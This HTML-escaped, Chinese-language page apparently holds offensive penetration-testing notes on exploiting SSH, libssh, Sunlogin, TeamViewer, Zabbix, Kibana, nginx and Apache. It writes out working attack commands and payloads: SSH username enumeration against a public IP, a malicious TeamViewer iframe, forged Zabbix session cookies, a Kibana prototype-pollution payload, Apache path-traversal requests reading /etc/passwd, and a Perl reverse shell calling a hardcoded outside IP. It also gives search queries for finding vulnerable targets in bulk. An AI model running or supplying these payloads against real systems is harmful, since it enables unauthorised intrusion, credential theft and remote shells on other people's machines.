&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;fofa_viewer: https://github.com/wgpsec/fofa_viewer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/scanner/rsync/modules_list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts file:/root/ips.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set threads 10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ssh枚举-libssh认证绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh枚举-libssh认证绕过&#34;&gt;#&lt;/a&gt; ssh 枚举 libssh 认证绕过&lt;/h4&gt;
&lt;p&gt;（1）SSH 协议漏洞:&lt;/p&gt;
&lt;p&gt;CVE-2014-0160 版本很少，都被修复了；CVE_2020_15778 价值不高。&lt;/p&gt;
&lt;p&gt;OpenSSH 8.3p1 及之前版本中的 scp 的 scp.c 文件存在操作系统命令注入漏洞。该漏洞即使在禁用 ssh 登录的情况下，但是允许使用 scp 传文件，而且远程服务器允许使用反引号 (`)，可利用 scp 复制文件到远程服务器时，执行带有 payload 的 scp 命令，从而在后续利用中 getshell。需要漏洞版本 &amp;lt;= openssh-8.3p1，作用是通过 scp 来连接已知用户名密码的系统。&lt;/p&gt;
&lt;p&gt;CVE-2018-15473 - 用户名枚举&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/Rhynorater/CVE-2018-15473-Exploit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pip3 install -r requirements.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pip3 install paramiko==2.4.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python sshUsernameEnum.py --port 32013 --userList exampleInput.txt 123.58.236.76 作用是通过字典来判断对方 ssh 有没有与这个字典里匹配的用户名。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）libssh 服务端权限认证绕过漏洞 (CVE-2018-10933)&lt;br&gt;
 libssh 是一个提供 ssh 相关接口的开源库，包含服务端、客户端等。其服务 端代码中存在一处逻辑错误，攻击者可以在认证成功前发送 MSG_USERAUTH _SUCCESS 消息，绕过认证过程，未授权访问目标 SSH 服务器。&lt;/p&gt;
&lt;p&gt;环境启动后，我们可以连接 your-ip:2222 端口 (账号密码: myuser:mypassword)，这是一个合法的 ssh 流程。参考 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy8=&#34;&gt;https://www.seebug.org/&lt;/span&gt;&lt;br&gt;
vuldb/ssvid-97614 中给出的 POC，使用 python3 执行，即可在目标服务器上 RCE。&lt;/p&gt;
&lt;p&gt;漏洞链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvbGlic3NoL0NWRS0yMDE4LTEwOTMzL1JFQURNRS56aC1jbi5tZA==&#34;&gt;https://github.com/vulhub/vulhub/blob/master/libssh/CVE-2018-10933/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;向日葵rce-vnc口令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#向日葵rce-vnc口令&#34;&gt;#&lt;/a&gt; 向日葵 RCE、vnc 口令&lt;/h4&gt;
&lt;p&gt;（1）向日葵 RCE：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/Mr-xn/sunlogin_rce&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xrkRce.exe -h 192.168.46.157 -t scan&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c &amp;quot;ipconfig&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;扫描到端口后，针对特定版本进行命令执行操作，可直接反弹shell；可利用nc或者powershell或者其他目标上存在的程序进行反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）VNC 口令问题：&lt;/p&gt;
&lt;p&gt;可能未设置密码导致的未授权访问，也可以通过 msf 猜解密码爆破 vnc&lt;/p&gt;
&lt;h4 id=&#34;teamviewer-xss攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#teamviewer-xss攻击&#34;&gt;#&lt;/a&gt; teamviewer xss 攻击&lt;/h4&gt;
&lt;p&gt;通过网页调用除了命令执行，可以执行任意命令，配合 XSS 或者钓鱼使用，当发现对方是特定版本的 teamviewer 时，诱使对方访问构造好的 url 链接。&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt; cve-2020-13699 &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; Welcome to xiaodi! &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;style&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;height:1px;width:1px;&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;teamviewer10: --play \\attacker-IP\share\fake.tvs&amp;#x27;&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;zabbix-未授权-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zabbix-未授权-rce&#34;&gt;#&lt;/a&gt; zabbix 未授权 rce&lt;/h4&gt;
&lt;p&gt;Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由 server、agent、web 等模块组 成，其中 web 模块由 PHP 编写，用来显示数据库中的结果。默认端口：10051。&lt;/p&gt;
&lt;p&gt;漏洞复现 fofa 关键字:app=“ZABBIX - 监控系统” &amp;amp;&amp;amp; body=“saml”&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击脚本:https://github.com/L0ading-x/cve-2022-23131&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 cve-2022-23131.py http://127.0.0.1 Admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将生成的 zbx_signed_session 替换到当前目标的 cookie 中，点击登陆页面的 sign &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; with Single Sign-On (SAML)方式登陆，即可直接进入管理界面!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;手动复现：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;捕获的原来的cookie的值如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zbx_session=eyJzZXNzaW9uaWQiOiJlNWNjNjc2ZWUzNDRlNGU4ZWIzNxxxxsIxxxxxxxx xMa1lYYXBucWp0RXpMdTFmTVJPcTArOGtxbkFLemdIMTdxUlY1VnErSkpKUGVaZHE3 WG02aGtQd1wvWUxycDgrYXgzbEQ4RjF6ajlRVENHelE9PSJ9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进行base 64 解码后的结果为&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;sessionid&amp;quot;:&amp;quot;e5cc676ee3xxe8eb3790b521&amp;quot;,&amp;quot;sign&amp;quot;:&amp;quot;9Fv7yJLkYXapnqjtEzLu1fMROq0+8kqnAKzgH17qRV5Vxxx7Xm6hkPw\/YLrp8+ax3lD8F1zj9QTCGzQ==&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加Admin用户到cookie中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;saml_data&amp;quot;:&amp;#123;&amp;quot;username_attribute&amp;quot;:&amp;quot;Admin&amp;quot;&amp;#125;,&amp;#123;&amp;quot;sessionid&amp;quot;:&amp;quot;e5cc6xxxx4e4e8eb3790b521&amp;quot;,&amp;quot;sign&amp;quot;:&amp;quot;9Fv7yJLkYXapnqjtEzLu1fMRxxxZdq7Xm6hkPw\/YLrp8+ax3lD8F1zj9QTCGzQ==&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;再次编码后伪造cookie发送&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eyJzYW1sX2RhdGEiOnsidxxxxjoiQWRtaW4ifSx7InNlc3Npb25pZCI6ImU1Y2M2NzZlZTM 0MDQ4NDM2NGU0ZThlYjM3OTBiNTIxIiwic2lnbiI6IjlGdjd5SkxrWVhhcG5xanRFekx1M WZNUk9xMCs4a3FuQUt6Z0gxN3FSVjVWcStKSkpQZVpkcTdYbTZoa1B3XC9ZTHJwOCt heDNsRDhGMXpqOVFUQ0d6UT09In0=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;zabbix可以写入一些script脚本并且执行此脚本的操作的，从后台的未授权直接突破到服务器的权限，再根据服务器的漏洞进行提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;kibana-任意代码执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kibana-任意代码执行&#34;&gt;#&lt;/a&gt; Kibana 任意代码执行&lt;/h4&gt;
&lt;p&gt;Kibana 为 Elassticsearch 设计的一款开源的视图工具。其 5.6.15 和 6.6.1 之前 的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601&lt;/p&gt;
&lt;p&gt;攻击脚本:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L0NWRS0yMDE5LTc2MDk=&#34;&gt;https://github.com/LandGrey/CVE-2019-7609&lt;/span&gt;&lt;br&gt;
 复现链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIva2liYW5hL0NWRS0yMDE5LTc2MDkvUkVBRE1FLnpoLWNuLm1k&#34;&gt;https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2019-7609/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;原型链污染发生在“Timeline”页面，我们填入如下 Payload:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.es(*).props(label.__proto__.env.AAAA=&amp;#x27;require(&amp;quot;child_process&amp;quot;).exec(&amp;quot;/bin/touch /tmp/success&amp;quot;);process.exit()//&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.props(label.__proto__.env.NODE_OPTIONS=&amp;#x27;--require /proc/self/environ&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;成功后再访问“Canvas”页面触发命令/bin/touch /tmp/success，文件成功创建&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以配合py脚本和Fofaviewer批量搜索目标测试漏洞：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;中间件安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#中间件安全&#34;&gt;#&lt;/a&gt; 中间件安全&lt;/h3&gt;
&lt;h4 id=&#34;nginx-文件解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nginx-文件解析&#34;&gt;#&lt;/a&gt; nginx 文件解析&lt;/h4&gt;
&lt;p&gt;配置文件错误导致解析漏洞，对于任意文件名，在后面添加 /xxx.php (xxx 为任意字符) 后，即可将文件作为 php 解析。如 info.jpg 后面加上 /xxx.php，会将 info.jpg 以 php 解析。&lt;/p&gt;
&lt;p&gt;复现链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L25naW54X3BhcnNpbmdfdnVsbmVyYWJpbGl0eS8=&#34;&gt;https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CVE-2013-4547:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L0NWRS0yMDEzLTQ1NDcv&#34;&gt;https://vulhub.org/#/environments/nginx/CVE-2013-4547/&lt;/span&gt;&lt;br&gt;
CVE-2013-4547 文件名逻辑漏洞，影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7。抓包，修改为 info.jpg…php, 在 Hex 选修卡中将 jpg 后面的两个点 2e 改成&lt;br&gt;
 20,00。寻找上传点，并且确定版本合适可测试该漏洞。&lt;/p&gt;
&lt;p&gt;CVE_2021_23017 无 EXP，没有可以直接拿权限的代码&lt;/p&gt;
&lt;p&gt;CVE_2017_7529 信息泄漏意义不大&lt;/p&gt;
&lt;h4 id=&#34;apache-文件解析-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apache-文件解析-rce&#34;&gt;#&lt;/a&gt; apache 文件解析 rce&lt;/h4&gt;
&lt;p&gt;(1)CVE-2021-41773&lt;/p&gt;
&lt;p&gt;Apache HTTP Server 目录遍历漏洞 CVE-2021-41773，影响版本：Apache HTTP Server 2.4.49，该漏洞是由于 Apache HTTP Server 2.4.49 版本存在目录穿 越漏洞，攻击者利用该漏洞在未授权的情况下，访问服务器未在 httpd 配置文件中标记为拒绝请求的文件内容，进而导致敏感信息泄露。&lt;/p&gt;
&lt;p&gt;漏洞链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI5MzE3Mi5odG1s&#34;&gt;https://www.freebuf.com/articles/web/293172.html&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问并下载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -s --path-as-is &amp;quot;http://ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -s --path-as-is -d &amp;#x27;echo Content-Type: text/plain; echo;whoami&amp;#x27; &amp;quot;http://ip:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -s --path-as-is -d &amp;#x27;echo Content-Type: text/plain; echo;perl -e &amp;#x27;use&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;此为perl语言生成的反弹shell命令，可通过棱角社区直接生成&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Socket;$i=&amp;quot;47.94.236.117&amp;quot;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）CVE-2021-42013&lt;/p&gt;
&lt;p&gt;Apache HTTP Server 目录遍历漏洞 CVE-2021-42013 影响版本：Apache HTTP&lt;/p&gt;
&lt;p&gt;Server 2.4.50 &amp;amp; Apache HTTP Server 2.4.49，该漏洞是由于在 Apache HTTP Server 2.4.50 版本中对 CVE-2021-41773 修复不够完善，攻击者可利用该漏洞绕过修复 补丁，并利用目录穿越攻击访问服务器中一些文件，进而造成敏感信息泄露。 若 httpd 中开启 CGI 功能，攻击者可以构造恶意请求，造成远程代码执行。&lt;/p&gt;
